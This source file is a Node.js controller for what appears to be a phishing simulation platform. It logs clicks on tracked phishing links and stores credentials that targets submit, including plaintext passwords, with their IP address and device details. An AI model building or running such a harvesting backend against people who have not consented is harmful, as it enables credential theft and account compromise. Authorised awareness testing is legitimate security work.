// src/controllers/trackingController.js

import EmailClick from '../models/EmailClick.js';
import Submission from '../models/Submission.js';
import CampaignTracking from '../models/CampaignTracking.js';
import { getClientIP } from '../utils/utils.js';

// Log phishing link click
export const logLinkClick = async (req, res) => {
    try {
        const { trackingId } = req.body; // Fetch trackingId from the request body

        // const delay = (ms) => new Promise((resolve) => setTimeout(resolve, ms));
        // await delay(5000);

        if (!trackingId) {
            return res.status(400).json({
                success: false,
                message: 'The Web URL or Link is incomplete. Please check your email.',
            });
        }

        // Find CampaignTracking by shortId instead of _id
        const campaignTracking = await CampaignTracking.findOne({ shortId: trackingId }).populate('campaign');
        if (!campaignTracking) {
            return res.status(404).json({
                success: false,
                message: 'The Web URL or Link is invalid. Please check your email.',
            });
        }

        const { campaign, email } = campaignTracking;

        // Check if the campaign tracking status is disabled
        if (campaign.status == 'disabled') {
            return res.status(403).json({
                success: false,
                message: 'Campaign tracking is currently disabled.',
            });
        }

        // Check if an EmailClick record exists
        const existingClick = await EmailClick.findOne({ email, campaign: campaign._id });

        if (existingClick) {
            // Increment the count if it exists
            existingClick.count += 1;
            await existingClick.save();
        } else {
            // Create a new EmailClick record if it doesn't exist
            await EmailClick.create({
                email,
                ipAddress: getClientIP(req),
                device: req.headers['user-agent'],
                campaign: campaign._id,
            });
        }

        res.status(200).json({
            success: true,
            message: 'Event logged successfully',
        });
    } catch (error) {
        console.error('Error logging link click:', error);
        res.status(500).json({
            success: false,
            message: error.message,
        });
    }
};

// Handle submitted credentials
export const handleCredSubmission = async (req, res) => {
    try {
        const { trackingId, email, password } = req.body;

        if (!trackingId || !email || !password) {
            return res.status(400).json({
                success: false,
                message: 'Incomplete credentials provided',
            });
        }

        const campaignTracking = await CampaignTracking.findOne({ shortId: trackingId }).populate('campaign');
        if (!campaignTracking) {
            return res.status(404).json({
                success: false,
                message: 'The Web URL or Link is invalid. Please check your email.',
            });
        }

        const { campaign } = campaignTracking;

        await Submission.create({
            email: campaignTracking.email,
            submittedEmail: email,
            password,
            ipAddress: getClientIP(req),
            device: req.headers['user-agent'],
            campaign: campaign._id,
        });

        res.status(200).json({
            success: true,
            message: 'Credentials submitted successfully',
        });
    } catch (error) {
        console.error('Error handling credential submission:', error);
        res.status(500).json({
            success: false,
            message: error.message,
        });
    }
};
